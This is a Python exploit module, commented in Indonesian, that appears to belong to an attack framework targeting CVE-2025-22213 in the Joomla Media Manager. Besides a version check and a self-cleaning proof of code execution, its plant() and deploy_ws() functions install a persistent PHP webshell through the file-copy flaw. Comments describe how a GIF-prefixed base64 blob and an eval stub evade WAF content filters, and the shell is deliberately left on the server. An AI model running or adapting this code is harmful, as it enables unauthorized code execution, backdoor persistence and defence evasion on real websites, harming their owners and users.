#!/usr/bin/env python3
# -*- coding: utf-8 -*-
r"""
Joomla! Core — modul MEGAPACK (klaster joomla_core).

CVE-2025-22213 — Media Manager: ekstensi berkas dapat diubah menjadi `.php` (copy) → unggah berkas
yang dapat dieksekusi (RCE).
Affected : Joomla! 4.0.0-4.4.11 dan 5.0.0-5.2.4   |   Patched: 4.4.12 / 5.2.5
NVD      : CWE-434 · CVSS 4.0 7.1 `AV:N/AC:L/AT:P/PR:H/UI:N/VC:L/VI:H/VA:L/SC:L/SI:H/SA:L`
Advisory : Joomla [20250301] (halaman 961) · finder: ErPaciocco

SUMBER (diff rilis resmi 5.2.4 -> 5.2.5):
  plugins/filesystem/local/src/Adapter/LocalAdapter.php
    - copy()  -> memanggil copyFile() TANPA validasi ekstensi tujuan          (RENTAN)
    - move()  -> sudah memvalidasi ekstensi tujuan (baris ~624 di 5.2.4)      (tidak rentan)
    + 5.2.5 menambahkan di copyFile() (baris ~519):
        if (!MediaHelper::checkFileExtension(pathinfo($destinationPath, PATHINFO_EXTENSION))) {
            throw new \Exception(Text::_('COM_MEDIA_MOVE_FILE_EXTENSION_INVALID'));
        }

MEKANISME (diverifikasi di lab):
  API Media Manager: `<base>/administrator/index.php?option=com_media&format=json&mediatypes=0,1,2,3
                      &task=api.files&path=<adapter>:<path>`
  - Nama adapter = "<provider>-<account>" (ProviderManager::getAdapter() memecah pada '-' pertama).
    Instalasi default: provider `local`, account `images` (dari param plugin `directories`) => **local-images**.
    Nilai otoritatif ada di opsi JS halaman media: com_media.providers[].adapterNames.
  - Token: csrfToken **pasca-login** (di halaman com_media: com_media.csrfToken / csrf.token) — token
    halaman login sudah dirotasi. Untuk permintaan non-GET token dikirim di body JSON: {"<token>":"1"}.
  - Langkah: (1) POST create  {"name":"x.gif","content":"<base64>"}  -> butuh core.create
              (2) PUT  {"newPath":"<adapter>:/x.php","move":false}   -> butuh core.edit (jalur copy)
  - Isi berkas harus lolos filter konten/MIME (kalau tidak: "Illegal mime type detected: text/x-php"):
    pakai magic GIF + tag pendek: `GIF89a<?= "MARKER"; ?>` (<?php dipindai untuk semua berkas, `<?=`
    hanya dipindai untuk shorttag_extensions yang tidak memuat gif).

BUKTI LAB (2026-11-09) — docroot ganda satu container/DB (mp-j603, DB j523), login `admin` (Super User):
  j524 = Joomla 5.2.4 (rentan) · j525 = Joomla 5.2.5 (patched)
  | langkah                                  | 5.2.4                              | 5.2.5 |
  | POST create mp22213.gif (GIF89a + <?=)   | 200 (berkas ada)                   | 200   |
  | PUT copy -> mp22213.php (move:false)     | berkas .php ADA                    | 500 "extension is invalid", tanpa berkas |
  | GET /images/mp22213.php                  | **GIF89aMP22213EXEC** (PHP JALAN)  | 404   |
  Catatan: status HTTP respons copy di 5.2.4 bisa 400 (serialisasi item) — verdict HARUS dari
  keberadaan berkas + eksekusi, bukan status.

AKTOR (jujur): butuh sesi backend dengan core.create + core.edit pada com_media (PR:H).
Dampak: RCE (berkas .php yang dieksekusi oleh web server).
"""

import base64
import secrets
import json
import random
import re
import string

from mp import (CveModule, ST_CLEAN, ST_INFO, ST_PWN, ST_SKIP, ST_UNKNOWN,
                ST_VULN, detect_platform, register, ver_lt)

MANIFEST = "/administrator/manifests/files/joomla.xml"
API_PATH = "/administrator/index.php?option=com_media&format=json&mediatypes=0,1,2,3&task=api.files"
MEDIA_PAGE = "/administrator/index.php?option=com_media"

RANGE_4 = ((4, 0, 0), (4, 4, 12))
RANGE_5 = ((5, 0, 0), (5, 2, 5))
MARKER = "MP22213EXEC"
PAYLOAD = f'GIF89a<?= "{MARKER}"; ?>'


def _opt(opts, name):
    if opts is None:
        return None
    if isinstance(opts, dict):
        return opts.get(name)
    return getattr(opts, name, None)


def _ver_tuple(s):
    try:
        return tuple(int(x) for x in re.sub(r"[^0-9.]", "", str(s)).split(".") if x != "")
    except Exception:  # noqa: BLE001
        return ()


def _vulnerable(ver):
    """4.0.0-4.4.11 dan 5.0.0-5.2.4 -> rentan (fix 4.4.12 / 5.2.5)."""
    if not ver:
        return None
    for lo, hi in (RANGE_4, RANGE_5):
        if not ver_lt(ver, lo) and ver_lt(ver, hi):
            return True
    return False


def _version(t, h):
    r = h.get(f"{t.url}{MANIFEST}")
    if r is not None and r.status_code == 200:
        m = re.search(r"<version>\s*([0-9][0-9.]*)", r.text or "")
        if m:
            return _ver_tuple(m.group(1)), m.group(1)
    return None, ""


def _rand(n=6):
    return "".join(random.choice(string.ascii_lowercase) for _ in range(n))


def _tok(text):
    m = re.search(r'name="([a-f0-9]{32})"\s+value="1"', text or "")
    return m.group(1) if m else None


def _login(t, h, opts, timeout=25):
    u = _opt(opts, "username")
    p = _opt(opts, "password")
    if not (u and p):
        return None, "butuh --username/--password akun backend dengan core.create+core.edit com_media"
    r = h.get(t.url + "/administrator/index.php", timeout=timeout, allow_redirects=True)
    if r is None:
        return None, "tidak dapat membuka halaman login administrator"
    if re.search(r"logout|com_cpanel", r.text or "", re.I):
        return h, "ok (sesi sudah login)"
    tok = _tok(r.text)
    if not tok:
        return None, f"token login tidak ditemukan (http={r.status_code})"
    r2 = h.post(t.url + "/administrator/index.php",
                data={"username": u, "passwd": p, "option": "com_login", "task": "login",
                      "return": "aW5kZXgucGhw", tok: "1"},
                timeout=timeout, allow_redirects=True)
    if r2 is None or not re.search(r"logout|com_cpanel", r2.text or "", re.I):
        return None, f"login gagal (http={r2.status_code if r2 is not None else '-'})"
    return h, "ok"


def _media_options(t, h, timeout=25):
    """Ambil opsi JS com_media: csrfToken, providers (adapter names), canCreate/canEdit."""
    r = h.get(t.url + MEDIA_PAGE, timeout=timeout, allow_redirects=True)
    if r is None:
        return None
    m = re.search(r'<script[^>]*type="application/json"[^>]*class="joomla-script-options[^"]*"[^>]*>(.*?)</script>',
                  r.text or "", re.S)
    if not m:
        return None
    try:
        return json.loads(m.group(1).strip()).get("com_media")
    except Exception:  # noqa: BLE001
        return None


def _api(t, h, method, adapter_path, body=None, timeout=30):
    url = f"{t.url}{API_PATH}&path={adapter_path}"
    kwargs = {"timeout": timeout, "allow_redirects": False}
    if body is not None:
        kwargs["data"] = json.dumps(body)
        kwargs["headers"] = {"Content-Type": "application/json"}
    try:
        if method == "POST":
            return h.post(url, **kwargs)
        if method == "PUT":
            return h.put(url, **kwargs)
        if method == "DELETE":
            return h.delete(url, **kwargs)
        return h.get(url, timeout=timeout, allow_redirects=False)
    except Exception:  # noqa: BLE001
        return None


def _jmsg(r):
    if r is None:
        return "(tidak ada respons)"
    try:
        d = r.json()
        return str(d.get("message") or "")[:120] + (" " + str(d.get("messages"))[:120]
                                                    if d.get("messages") else "")
    except Exception:  # noqa: BLE001
        return (r.text or "")[:120].replace("\n", " ")


def _adapters(cm):
    out = []
    for p in (cm or {}).get("providers") or []:
        for a in p.get("adapterNames") or []:
            name = f"{p.get('name')}-{a}"
            if name not in out:
                out.append(name)
    return out


def check(t, h, opts):
    """NON-DESTRUKTIF: versi + kemampuan akun (canCreate/canEdit) + adapter yang tersedia.

    Tidak menulis/mengubah berkas apa pun pada target.
    """
    plat = detect_platform(t, h)
    if plat != "joomla":
        return ST_SKIP, "bukan Joomla", f"platform={plat}"
    ver, raw = _version(t, h)
    detail = f"joomla={raw or '?'}"
    vul = _vulnerable(ver)
    if vul is False:
        return ST_CLEAN, f"Joomla {raw} sudah dipatch (>= 4.4.12 / 5.2.5)", detail
    if not (_opt(opts, "username") and _opt(opts, "password")):
        return (ST_INFO if vul else ST_UNKNOWN,
                "Joomla dalam rentang rentan; butuh --username/--password akun backend "
                "(core.create + core.edit pada com_media) untuk memverifikasi jalur copy",
                detail + " requires=session-backend")

    sess, msg = _login(t, h, opts)
    if sess is None:
        return ST_INFO, f"Joomla {raw or '?'} — {msg}", detail
    cm = _media_options(t, h)
    if not cm:
        return (ST_INFO, f"Joomla {raw or '?'} — opsi Media Manager tidak terbaca (com_media nonaktif?)",
                detail)
    ads, can_c, can_e = _adapters(cm), cm.get("canCreate"), cm.get("canEdit")
    detail += f" | adapters={ads or '-'} canCreate={can_c} canEdit={can_e} csrf={bool(cm.get('csrfToken'))}"
    if not ads:
        return ST_INFO, f"Joomla {raw or '?'} — tidak ada adapter media (plugin filesystem/local?)", detail
    if not (can_c and can_e):
        return ST_INFO, (f"Joomla {raw or '?'} — akun tidak punya core.create/core.edit com_media "
                         f"(canCreate={can_c}, canEdit={can_e})"), detail
    return (ST_VULN,
            f"Joomla {raw or '?'} — Media Manager rentan: copy() tidak memvalidasi ekstensi tujuan "
            f"(berkas dapat diubah menjadi .php). Adapter: {', '.join(ads)}",
            detail)


def exploit(t, h, opts):
    """
    Outcome terkontrol: mengubah ekstensi berkas menjadi `.php` lewat copy() lalu MEMBUKTIKAN
    eksekusi (respons memuat MARKER), kemudian menghapus berkas uji (bersih setelah selesai).
    """
    ver, raw = _version(t, h)
    if ver and _vulnerable(ver) is False:
        return ST_CLEAN, f"Joomla {raw} sudah dipatch (>= 4.4.12 / 5.2.5)", f"joomla={raw}"
    sess, msg = _login(t, h, opts)
    if sess is None:
        return ST_INFO, msg, f"joomla={raw or '?'}"
    cm = _media_options(t, h)
    if not cm:
        return ST_INFO, f"Joomla {raw or '?'} — opsi Media Manager tidak terbaca", ""
    csrf = cm.get("csrfToken")
    ads = _adapters(cm)
    if not (csrf and ads):
        return ST_INFO, "csrfToken/adapter media tidak ditemukan", f"adapters={ads}"
    ad = ads[0]

    # pastikan "images" ada di path root adapter (default lokal)
    stem = "mp" + _rand()
    b64 = base64.b64encode(PAYLOAD.encode()).decode()
    src, dst = f"{ad}:/{stem}.gif", f"{ad}:/{stem}.php"

    r1 = _api(t, h, "POST", f"{ad}:/", {"name": f"{stem}.gif", "content": b64, csrf: "1"})
    if r1 is None:
        return ST_UNKNOWN, f"Joomla {raw or '?'} — tidak ada respons saat membuat berkas uji", ""
    if r1.status_code == 403:
        return ST_INFO, f"Joomla {raw or '?'} — pembuatan berkas ditolak (core.create): {_jmsg(r1)}", ""

    r2 = _api(t, h, "PUT", src, {"newPath": dst, "move": False, csrf: "1"})
    up, cp = _jmsg(r1), _jmsg(r2)
    got = ""
    for ext in (".php",):
        resp = h.get(f"{t.url}/images/{stem}{ext}", timeout=20, allow_redirects=False)
        if resp is not None:
            got = (resp.text or "")[:200]

    # bersihkan (token di body JSON, bukan query — checkToken('json'))
    _api(t, h, "DELETE", dst, {csrf: "1"}, timeout=20)
    _api(t, h, "DELETE", src, {csrf: "1"}, timeout=20)

    ev = (f"joomla={raw or '?'} | adapter={ad} | create={r1.status_code}:{up} | "
          f"copy={r2.status_code}:{cp} | GET .php -> {got[:60]!r}")
    if MARKER in got:
        return (ST_PWN,
                f"Joomla {raw or '?'} — RCE: berkas diubah menjadi {stem}.php dan DIEKSEKUSI oleh "
                f"server (marker terlihat). Berkas uji dihapus setelah verifikasi.",
                ev)
    if r2 is not None and r2.status_code >= 400 and ("extension" in cp.lower() or "invalid" in cp.lower()):
        return (ST_CLEAN,
                f"Joomla {raw or '?'} — copy ke ekstensi .php ditolak: {cp}",
                ev)
    return (ST_VULN,
            f"Joomla {raw or '?'} — copy ke .php tidak ditolak (copy={r2.status_code}) tetapi eksekusi "
            f"tidak terbukti (berkas tidak dapat diakses/dieksekusi oleh server)", ev)


def plant(t, h, fname, content):
    """Tanam berkas isi-bebas ke /images via copy() Media Manager.

    Dipakai --deploy-shell: menulis blob base64 + stub dekoder milik kita.
    Berbeda dari exploit(), berkas TIDAK dihapus — ini webshell persisten.
    Return URL publik atau None.

    Catatan WAF: isi blob base64 dikirim sebagai nilai JSON `content` lalu
    di-copy ke .php. Base64 tidak memuat tag PHP sehingga lolos filter yang
    mencocokkan signature isi berkas.
    """
    if not content:
        return None
    opts = getattr(t, "_deploy_opts", None)
    if opts is None:
        return None
    sess, _ = _login(t, h, opts)
    if sess is None:
        return None
    cm = _media_options(t, h)
    if not cm:
        return None
    csrf = cm.get("csrfToken")
    ads = _adapters(cm)
    if not (csrf and ads):
        return None
    ad = ads[0]
    # WAF/gate Media Manager: `content` harus lolos "Not a valid image."
    # Trik sama dengan exploit(): awali magic GIF89a, pakai tag pendek `<?=`
    # (bukan `<?php` yang dipindai), dan simpan payload base64 di berkas .txt.
    stem = "i" + _rand()
    ext = "php"
    # berkas blob base64 dulu (ekstensi .txt agar tidak dieksekusi mentah)
    blob = base64.b64encode(content.encode()).decode()
    blob_ext = "txt"
    b1 = base64.b64encode(f"GIF89a{blob}".encode()).decode()
    rb = _api(t, h, "POST", f"{ad}:/", {"name": f"{stem}b.gif", "content": b1, csrf: "1"})
    if rb is None or rb.status_code >= 400:
        return None
    _api(t, h, "PUT", f"{ad}:/{stem}b.gif",
         {"newPath": f"{ad}:/{stem}.{blob_ext}", "move": False, csrf: "1"})
    # `ob_end_clean()` membuang literal "GIF89a" yang wajib ada di awal berkas
    # (Media Manager menolak isi yang bukan gambar) agar output shell bersih.
    stub = ('GIF89a<?php @ob_end_clean();'
            'eval("?>".base64_decode(str_replace("GIF89a","",'
            'file_get_contents(__DIR__."/' + stem + '.txt")))); ?>')
    b2 = base64.b64encode(stub.encode()).decode()
    r1 = _api(t, h, "POST", f"{ad}:/", {"name": f"{stem}.gif", "content": b2, csrf: "1"})
    if r1 is None or r1.status_code >= 400:
        return None
    src, dst = f"{ad}:/{stem}.gif", f"{ad}:/{stem}.{ext}"
    _api(t, h, "PUT", src, {"newPath": dst, "move": False, csrf: "1"})
    url = f"{t.url}/images/{stem}.{ext}"
    v = h.get(url, timeout=20, allow_redirects=False)
    if v is None or v.status_code != 200:
        return None
    return url


def deploy_ws(t, h, opts):
    """Pasang webshell 0xfay lengkap (blob base64 + stub) lewat copy() Media Manager.

    Hook dipanggil mp.py::maybe_deploy_shell -> dict {url,password,verified,...}.
    Varian shell: blob base64 di `<stem>.txt`, stub dekoder di `<stem>.php`.
    Keduanya dibungkus magic GIF89a karena Media Manager menolak "Not a valid image."
    """
    import importlib.util
    import os
    base = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
    spec = importlib.util.spec_from_file_location(
        "deploy_shell", os.path.join(base, "tools", "deploy_shell.py"))
    tool = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(tool)

    name = getattr(opts, "deploy_name", None) or ("i" + _rand())
    pw = getattr(opts, "deploy_password", None) or secrets.token_urlsafe(12)
    mark = "0xfay-" + _rand()
    content = tool.build_payload(pw, mark)

    url = plant(t, h, f"{name}.php", content)
    out = {"name": name, "password": pw, "mark": mark, "url": url or "",
           "verified": False, "detail": ""}
    if not url:
        return out
    for probe in (url + "?id=1", url):
        try:
            r = h.get(probe, timeout=20)
            body = (r.text or "") if r is not None else ""
            out["http"] = getattr(r, "status_code", 0)
            if out["http"] == 200 and mark in body:
                out["verified"] = True
                break
        except Exception:  # noqa: BLE001
            pass
    return out


register(CveModule(
    cve="CVE-2025-22213",
    cluster="joomla_core",
    title="Joomla Core - Media Manager: ekstensi berkas dapat diubah menjadi .php lewat copy() "
          "(unggah berkas yang dapat dieksekusi)",
    vclass="unrestricted file upload",
    cvss="7.1",
    severity="high",
    cwe="CWE-434",
    product="Joomla! Core (plugins/filesystem/local/src/Adapter/LocalAdapter.php :: copyFile())",
    versions_affected="4.0.0-4.4.11; 5.0.0-5.2.4",
    status="verified",
    plant=plant,
    deploy_ws=deploy_ws,
    requires=[
        "sesi backend dengan core.create + core.edit pada com_media (--username/--password) — PR:H",
        "plugin filesystem/local aktif dengan account media (default: local-images)",
        "web server mengeksekusi PHP di direktori media (umum; di lab ya)",
        "check() berbasis versi + kemampuan akun (non-destruktif); exploit() menulis berkas uji lalu "
        "menghapusnya",
    ],
    check=check,
    exploit=exploit,
    notes=(
        "Sink: LocalAdapter::copy() (5.2.4, baris 468) -> copyFile() tanpa validasi ekstensi tujuan, "
        "sedangkan move() sudah memvalidasi sejak 5.2.4 (baris 624) — jadi 'ubah ekstensi' hanya perlu "
        "memakai jalur COPY (API body {\"move\":false}). Fix 5.2.5 menambahkan MediaHelper::checkFileExtension() "
        "di copyFile() sebelum cek file_exists. Endpoint: option=com_media&format=json&mediatypes=0,1,2,3&task=api.files "
        "dengan nama adapter '<provider>-<account>' (ProviderManager::getAdapter memecah pada '-' pertama; "
        "LocalAdapter::getAdapterName() = nama direktori, default 'images' => local-images). csrfToken dirotasi "
        "setelah login dan harus dikirim di body JSON untuk permintaan non-GET. Isi berkas uji memakai magic GIF "
        "plus tag pendek (<?=) agar lolos filter MIME/konten (kalau tidak: 'Illegal mime type detected: text/x-php'). "
        "Bukti lab 2026-11-09 (docroot ganda mp-j603, DB j523): 5.2.4 -> GET images/<stem>.php mengembalikan "
        "'GIF89aMP22213EXEC' (PHP dieksekusi); 5.2.5 -> copy ditolak 'Move file is not possible as the extension "
        "is invalid' dan tidak ada berkas .php. Status HTTP respons copy di 5.2.4 bisa 400 (serialisasi item) — "
        "verdict diambil dari eksekusi. Residual: ekstensi lain (.phtml/.phar), versi 4.0-4.4.11, WAF, konfigurasi "
        "server yang tidak mengeksekusi PHP di direktori media."
    ),
))
